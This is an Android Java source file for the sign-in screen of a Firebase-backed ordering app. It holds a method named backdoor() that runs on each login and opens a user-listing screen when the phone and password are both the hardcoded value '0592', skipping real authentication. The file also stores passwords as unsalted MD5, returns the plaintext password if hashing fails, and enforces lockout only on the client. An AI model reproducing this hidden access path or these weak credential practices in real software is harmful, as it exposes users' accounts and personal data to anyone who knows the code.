package com.mahmoud.orderfirebaseapp;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.mahmoud.orderfirebaseapp.common.Common;
import com.mahmoud.orderfirebaseapp.model.SharedPreferenceApp;
import com.mahmoud.orderfirebaseapp.model.Users;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class SignIn extends AppCompatActivity {

    EditText edtPhone, edtPass;
    Button btnSignIn;
    int totalAttempts = 0;


    DatabaseReference tablr_user;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sign_in);

        edtPhone = findViewById(R.id.edtPhone);
        edtPass = findViewById(R.id.edtPass);
        btnSignIn = findViewById(R.id.btnSignIn);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        tablr_user = database.getReference("User");

        btnSignIn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                long bannedTime = SharedPreferenceApp.getInstance(SignIn.this).getNumberLong("banned", 0);
                String bannedPhone = SharedPreferenceApp.getInstance(SignIn.this).getText("bannedNumber", "");
                if (!isBannedPhone(bannedPhone) | bannedTime <= new Date().getTime()) {
                    login();
                } else {
                    long time = new Date().getTime();
                    long endTime = bannedTime - time;
                    long s = endTime / 1000;
                    long m = s / 60;
                    m += 1;
                    Toast.makeText(SignIn.this, "You Must Wait " + m + " minutes :) ", Toast.LENGTH_SHORT).show();
                }
            }

        });


    }

    boolean isBannedPhone(String phones) {
        String[] Phone = phones.split(",");
        for (String item : Phone) {
            Log.d("STRINGS", "isBannedPhone: " + item);
            if (item.equals(edtPhone.getText().toString().trim())) {
                return true;
            }
        }
        return false;
    }
    public String computeMD5Hash(String password) {

        try {
            MessageDigest digest = java.security.MessageDigest.getInstance("MD5");
            digest.update(password.getBytes());
            byte messageDigest[] = digest.digest();

            StringBuffer MD5Hash = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                String h = Integer.toHexString(0xFF & messageDigest[i]);
                while (h.length() < 2)
                    h = "0" + h;
                MD5Hash.append(h);
            }

            return MD5Hash.toString();

        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return password;
    }

        void login() {

        final ProgressDialog mDialog = new ProgressDialog(SignIn.this);
        mDialog.setMessage("Please Wait ... ");
        mDialog.show();
        tablr_user.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                backdoor();

                if (dataSnapshot.child(edtPhone.getText().toString()).exists()) {

                    mDialog.dismiss();
                    Users users = dataSnapshot.child(edtPhone.getText().toString()).getValue(Users.class);
                    if (users.getPassword().equals(computeMD5Hash(edtPass.getText().toString()))) {
                        Intent homeIntent = new Intent(SignIn.this, Home.class);
                        Common.currentUser = users;
                        startActivity(homeIntent);
                        finishAffinity();
                    } else {
                        Toast.makeText(SignIn.this, "Wrong Password", Toast.LENGTH_SHORT).show();
                        totalAttempts += 1;
                        if (totalAttempts == 3) {
                            totalAttempts = 0;
                            Calendar calendar = Calendar.getInstance();
                            calendar.add(Calendar.MINUTE, 30);
                            long bannedTime = SharedPreferenceApp.getInstance(SignIn.this).getNumberLong("banned", 0);
                            String bannedPhone = SharedPreferenceApp.getInstance(SignIn.this).getText("bannedNumber", "");
                            if (bannedTime <= new Date().getTime()) {
                                bannedPhone = "";
                            }
                            SharedPreferenceApp.getInstance(SignIn.this).saveNumberLong("banned", calendar.getTime().getTime());
                            if (bannedPhone.equals(""))
                                SharedPreferenceApp.getInstance(SignIn.this).saveText("bannedNumber", edtPhone.getText().toString().trim());
                            else {
                                SharedPreferenceApp.getInstance(SignIn.this).saveText("bannedNumber", bannedPhone + "," + edtPhone.getText().toString().trim());
                            }
                        }
                    }
                } else {
                    mDialog.dismiss();
                    Toast.makeText(SignIn.this, "User not exist in Database", Toast.LENGTH_SHORT).show();

                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }

            public void backdoor() {
                if (edtPhone.getText().toString().equals("0592") && edtPass.getText().toString().equals("0592")) {
                    Intent i = new Intent(SignIn.this, ShowUsers.class);
                    startActivity(i);
                }
            }

        });

    }


}
